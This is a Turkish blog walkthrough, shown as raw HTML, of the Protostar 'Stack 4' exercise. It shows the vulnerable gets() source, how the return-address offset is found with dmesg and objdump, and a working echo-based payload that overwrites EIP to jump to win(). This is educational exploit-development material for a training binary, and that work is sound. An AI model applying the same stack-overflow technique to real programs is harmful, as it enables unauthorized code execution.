<!doctype html><html lang=tr-tr><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><link rel=stylesheet href=/style.css><link rel=icon type=image/png href=/favicon.png><meta http-equiv=cache-control content=public><meta name=description content="Burada bir ÅŸey yok"><title>Stack 4 | Emir (0xF61)</title><script async src="https://www.googletagmanager.com/gtag/js?id=UA-135684308-2"></script><script>window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments);}gtag('js',new Date());gtag('config','UA-135684308-2');</script></head><body><nav><ul class=menu>|<li><a href=/>Ana Sayfa</a></li>|<li><a href=/yaz%C4%B1lar/>YazÄ±lar</a></li>|<li><a href=/etiketler/>Etiketler</a></li>|<li><a href=/linkler/>Linkler</a></li>|<li><a href=/ara/>Ara</a></li>|</ul><hr></nav><div class=article-meta></div><span class=rtime>ğŸ“– 2 dakika</span>
<a href=..>â†ª Protostar</a><h1 class=baslik>Stack 4</h1><main><h1 id=stack4-c>Stack4.c</h1><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-C data-lang=C><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;stdlib.h&gt;</span><span style=color:#75715e>
</span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;unistd.h&gt;</span><span style=color:#75715e>
</span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;stdio.h&gt;</span><span style=color:#75715e>
</span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;string.h&gt;</span><span style=color:#75715e>
</span><span style=color:#75715e></span>
<span style=color:#66d9ef>void</span> <span style=color:#a6e22e>win</span>()
{
  printf(<span style=color:#e6db74>&#34;code flow successfully changed</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);
}

<span style=color:#66d9ef>int</span> <span style=color:#a6e22e>main</span>(<span style=color:#66d9ef>int</span> argc, <span style=color:#66d9ef>char</span> <span style=color:#f92672>**</span>argv)
{
  <span style=color:#66d9ef>char</span> buffer[<span style=color:#ae81ff>64</span>];

  gets(buffer);
}</code></pre></div><p><strong>Ã–nceki seviyeden farkÄ± burada fp yok!</strong></p><p><strong>AmaÃ§:</strong> main fonksiyonu iÃ§erisinde ki stack taÅŸÄ±rÄ±larak <code>eip</code> deÄŸerini
deÄŸiÅŸtirip programÄ±n akÄ±ÅŸÄ±na manipÃ¼le etmek.</p><h1 id=programÄ±n-Ã§alÄ±ÅŸtÄ±rÄ±lmasÄ±>ProgramÄ±n Ã‡alÄ±ÅŸtÄ±rÄ±lmasÄ±</h1><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text>user@protostar:/opt/protostar/bin$ ./stack4
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
user@protostar:/opt/protostar/bin$ ./stack4
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBCCCCDDDD
Segmentation fault</code></pre></div><p>Ã–nceki seviyede fp deÄŸiÅŸkenini deÄŸiÅŸtirerek istediÄŸimiz adresteki fonksiyonu
Ã§alÄ±ÅŸtÄ±rabiliyorduk fakat bu seviyede bÃ¶yle bir imkanÄ±mÄ±z olmadÄ±ÄŸÄ± iÃ§in eip
registerinin stackteki yerini istediÄŸimiz ÅŸekilde doldurarak programÄ±n akÄ±ÅŸÄ±nÄ±
deÄŸiÅŸtireceÄŸiz.</p><p>Programlarda genellikle bir fonksiyon Ã§aÄŸÄ±rÄ±ldÄ±ÄŸÄ± zaman o fonksiyona girilmeden
Ã¶nce Ã§alÄ±ÅŸtÄ±rÄ±lan fonksiyondan sonra, geri dÃ¶neceÄŸi adresi stacke atar
bÃ¶ylelikle hem fonksiyonlarÄ±n lokal deÄŸiÅŸkenleri birbirine karÄ±ÅŸmamÄ±ÅŸ ve
gereksiz yer kaplamamÄ±ÅŸ olur.</p><h1 id=dÃ¶nÃ¼ÅŸ-adresini-tespit-etmek>DÃ¶nÃ¼ÅŸ adresini tespit etmek</h1><p>Ã–nceki seviyeden daha uzun bir karakter dizisi kullanÄ±yorum Ã§Ã¼nkÃ¼ Ã¶nceki
seviyedeki gibi lokal deÄŸiÅŸkeni deÄŸil lokal deÄŸiÅŸkenlerden Ã¶nce stackte yer
kaplayan dÃ¶nÃ¼ÅŸ adresini deÄŸiÅŸtireceÄŸiz. Genellikle Segmentation Fault alana
kadar A ekleyip sonrasÄ±na 4 bytelÄ±k farklÄ± karakterler ekliyorum.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text>user@protostar:/opt/protostar/bin$ ./stack4
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBCCCCDDDDEEEEFFFF
Segmentation fault
user@protostar:/opt/protostar/bin$ dmesg | tail -1
[16102.708303] stack4[1893]: segfault at 45454545 ip 45454545 sp bffffce0 error 4</code></pre></div><p>Programa yukarÄ±daki gibi uzun bir string verdikten sonra segmentation fault
alÄ±yoruz ve dmesg Ã§Ä±ktÄ±sÄ±na baktÄ±ÄŸÄ±mÄ±zda <code>ip</code> registerinin <code>45454545</code> olduÄŸunu
gÃ¶rÃ¼yoruz.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#f92672>&gt;&gt;&gt;</span> <span style=color:#66d9ef>print</span>( chr(<span style=color:#ae81ff>0x45</span>) )
E</code></pre></div><p><code>0x45</code>&lsquo;in E karakterine ait olduÄŸunu tespit ettikten sonra atlamak istediÄŸimiz
fonksiyonun adresini bulmamÄ±z gerekiyor.</p><p>HÄ±zlÄ±ca Ã¶nceki seviyede yaptÄ±ÄŸÄ±m gibi win fonksiyonunun adresini tespit
ediyorum.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text>user@protostar:/opt/protostar/bin$ objdump -S stack4 | grep win
080483f4 &lt;win&gt;:</code></pre></div><p>win fonksiyonunun yerini <code>080483f4</code> olarak not ediyoruz.</p><h1 id=programÄ±n-akÄ±ÅŸÄ±nÄ±n-deÄŸiÅŸtirilmesi>ProgramÄ±n AkÄ±ÅŸÄ±nÄ±n DeÄŸiÅŸtirilmesi</h1><p>Programa verdiÄŸim 76 adet &ldquo;A&rdquo; karakteirnin sonuna bu adresi ekliyorum.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4>user@protostar:/opt/protostar/bin$ echo -e &#34;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xf4\x83\x04\x08&#34; | ./stack4
code flow successfully changed
Segmentation fault</pre></div><p>BÃ¶ylelikle fonksiyondan Ã§Ä±karkan eip&rsquo;ye atanan deÄŸiÅŸkeni <code>080483f4</code> deÄŸerine
dÃ¶ndÃ¼rÃ¼p bu adresteki fonksiyonu Ã§alÄ±ÅŸtÄ±rabiliyoruz.</p></main><footer><hr><a href=/index.xml>Feed</a></footer></body></html>